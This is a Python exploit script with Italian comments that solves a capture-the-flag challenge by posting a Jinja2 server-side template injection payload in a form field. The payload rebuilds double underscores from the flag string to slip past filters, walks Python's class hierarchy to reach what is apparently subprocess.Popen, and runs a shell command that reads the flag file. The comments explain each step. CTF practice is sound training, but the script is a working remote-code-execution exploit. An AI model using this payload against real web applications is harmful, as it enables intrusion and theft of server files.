from requests import *

host = 'https://flagdownloader.challs.olicyber.it'

payload='{{[][config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2][ config["FLAG"][61]*2 + "mro" + config["FLAG"][61]*2][1][config["FLAG"][61]*2+"subclasses"+config["FLAG"][61]*2]()[360]("cat /flag*",shell=True,stdout=-1)["communicate"]()[0]}}'

data = {
    'inputEmail': 'a@a.a',
    'inputPassword': 'a',
    'inputAddress': payload,
    'inputCreditCard': '123'
}
r=session()
res = r.post(host + '/premium', data=data)

print(res.text)

#Questo payload è un classico esempio di Server-Side Template Injection (SSTI), specificamente progettato per il motore di template Jinja2 
# (molto comune in Flask/Python).L'obiettivo del payload è eseguire un comando di sistema (cat /flag*) per leggere un file segreto sul server, 
# aggirando eventuali filtri (WAF o blacklist) che bloccano l'uso diretto di termini come __class__ o dei doppi underscore (__).Scomposizione del PayloadIl 
# codice sfrutta l'introspezione di Python per risalire la gerarchia degli oggetti fino a trovare una funzione capace di eseguire comandi.1. 
# L'aggiramento dei filtri (Obfuscation)In molti casi, i sistemi di sicurezza bloccano la stringa __. 
# L'autore del payload ha trovato un modo creativo per ricostruirla:config["FLAG"][61] : Accede a una variabile di configurazione (comune nelle sfide CTF). 
# Si assume che al carattere 61 della flag ci sia un underscore _.config["FLAG"][61]*2 : Produce la stringa __.Quindi, config["FLAG"][61]*2 + "class" + config["FLAG"][61]*2 diventa dinamicamente la stringa "__class__".2.
#  La catena di introspezioneVediamo come il payload si muove all'interno degli oggetti Python:ComponenteSignificato[]Crea una lista vuota (un oggetto Python standard).[...]["__class__"]
# Accede alla classe dell'oggetto: <class 'list'>.[...]["__mro__"]Method Resolution Order: mostra la gerarchia delle classi. 
# Per una lista è (<class 'list'>, <class 'object'>).[1]Seleziona il secondo elemento della MRO, ovvero <class 'object'>. 
# Da qui si può accedere a tutto l'ambiente Python.[...]["__subclasses__"]()Elenca tutte le classi caricate in memoria che derivano da object.3. 
# L'esecuzione del comando (RCE)Una volta ottenuto l'elenco di tutte le sottoclassi di object:[360]: Seleziona la classe all'indice 360. 
# In questo specifico ambiente, l'indice 360 corrisponde probabilmente a subprocess.Popen, una classe usata per creare nuovi processi.
# ("cat /flag*", shell=True, stdout=-1): Inizializza la classe Popen per eseguire il comando shell. 
# stdout=-1 indica di catturare l'output (corrisponde alla costante subprocess.PIPE).["communicate"]()[0]: C
# hiama il metodo communicate() per attendere la fine del comando e recupera il primo elemento della tupla restituita, ovvero lo stdout 
# (il contenuto del file della flag).
